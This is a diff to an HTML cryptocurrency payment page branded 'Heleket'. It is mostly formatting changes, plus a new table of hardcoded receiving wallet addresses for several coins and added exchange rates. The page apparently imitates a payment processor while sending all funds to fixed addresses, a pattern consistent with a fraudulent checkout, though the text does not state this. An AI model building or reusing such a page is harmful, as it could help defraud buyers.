@@ -14,8 +14,8 @@
         background: #f5f6f7;
         color: #0f172a;
         font-family:
-          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial,
-          sans-serif;
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
+          Arial, sans-serif;
       }
       .wrap {
         min-height: 100%;
@@ -354,7 +354,12 @@
         <div class="top">
           <div class="logo">Heleket</div>
           <div class="topRight">
-            <button class="iconBtn" type="button" aria-label="Help" onclick="return false;">
+            <button
+              class="iconBtn"
+              type="button"
+              aria-label="Help"
+              onclick="return false;"
+            >
               ?
             </button>
             <div class="lang" aria-label="Language">
@@ -370,7 +375,9 @@
             <div class="toPayLabel">To pay:</div>
             <div class="badgeRow">
               <div class="badge" id="hk-net">Network:</div>
-              <div class="feeNote"><span class="iDot">i</span><span>You pay network fee</span></div>
+              <div class="feeNote">
+                <span class="iDot">i</span><span>You pay network fee</span>
+              </div>
             </div>
           </div>
           <div class="toPayRight">
@@ -382,8 +389,8 @@
         <div class="divider"></div>
 
         <div class="hint">
-          Scan the QR code (it contains only the address), enter the amount, and send
-          funds - or use the address below
+          Scan the QR code (it contains only the address), enter the amount, and
+          send funds - or use the address below
         </div>
 
         <div class="grid">
@@ -400,7 +407,12 @@
                 <div class="rowLabel">Wallet address for transfer:</div>
                 <div class="rowValue" id="hk-address"></div>
               </div>
-              <button class="copyBtn" type="button" id="hk-copy-address" aria-label="Copy address">
+              <button
+                class="copyBtn"
+                type="button"
+                id="hk-copy-address"
+                aria-label="Copy address"
+              >
                 ⧉
               </button>
             </div>
@@ -409,7 +421,12 @@
                 <div class="rowLabel">Transfer amount:</div>
                 <div class="rowValueMuted" id="hk-transfer"></div>
               </div>
-              <button class="copyBtn" type="button" id="hk-copy-amount" aria-label="Copy amount">
+              <button
+                class="copyBtn"
+                type="button"
+                id="hk-copy-amount"
+                aria-label="Copy amount"
+              >
                 ⧉
               </button>
             </div>
@@ -418,7 +435,10 @@
 
         <div class="warn">
           <span class="warnIcon">!</span>
-          <span>After payment, wait until you are redirected to the order confirmation page</span>
+          <span
+            >After payment, wait until you are redirected to the order
+            confirmation page</span
+          >
         </div>
 
         <div class="timerWrap">
@@ -458,7 +478,24 @@
         var network = String(params.get("network") || "").toUpperCase();
         var returnUrl = String(params.get("return") || "/checkout.html");
 
-        var walletAddress = "0x9d4e6b1c2cb72a5967b05da0614fcd59f8cff6fa";
+        var addressByCoin = {
+          BTC: "bc1qdmh9fwdy4fwnm7he6jgghxeelag32yausv0rv3",
+          ETH: "0x9D4E6b1c2Cb72A5967B05DA0614fcD59f8cFF6fA",
+          ADA: "addr1qygfjn089nezy2wcgpzjhysws0h9rz0cgtwfp7uysryl7azmunx99jnpj5zrf29hj4qg3wcssudsdyfa4wv65dxckkjsyhhc22",
+          QNT: "0x9D4E6b1c2Cb72A5967B05DA0614fcD59f8cFF6fA",
+          ALGO: "4PNEAKTNZUTM4FBBYHGKWB2F2DVFMYMM64GSXOAPNNIZXWDEGKKZ2D5H5A",
+          XDC: "F5Sm5ELi4xvnaQNLM2nd32UQNBX8TnwabCQ7xSaxHtnC",
+          XLM: "GDZQUL5UTWPUTUS6ZBAEYGICV235PLFK5JYKQVP3CEZROT2NIDXUHOIO",
+          XRP: "rpnoTuitEf2kKXP2qkXSg23Ctwd81dBitJ",
+        };
+
+        var walletAddress = null;
+        if (coin === "USDT" && network === "TRC20") {
+          walletAddress = "TRH3bhpgs1zf2xy4YMAYgQj2nXiVBwVvQF";
+        } else {
+          walletAddress =
+            addressByCoin[coin] || "0x9d4e6b1c2cb72a5967b05da0614fcd59f8cff6fa";
+        }
 
         var ratesUsd = {
           BTC: 76400,
@@ -471,6 +508,9 @@
           SOL: 170,
           XRP: 0.55,
           ADA: 0.45,
+          QNT: 120,
+          ALGO: 0.2,
+          XDC: 0.04,
           DOGE: 0.15,
           DOT: 7.5,
           MATIC: 0.85,
@@ -524,7 +564,7 @@
               },
               function () {
                 return false;
-              }
+              },
             );
           }
           var ta = document.createElement("textarea");
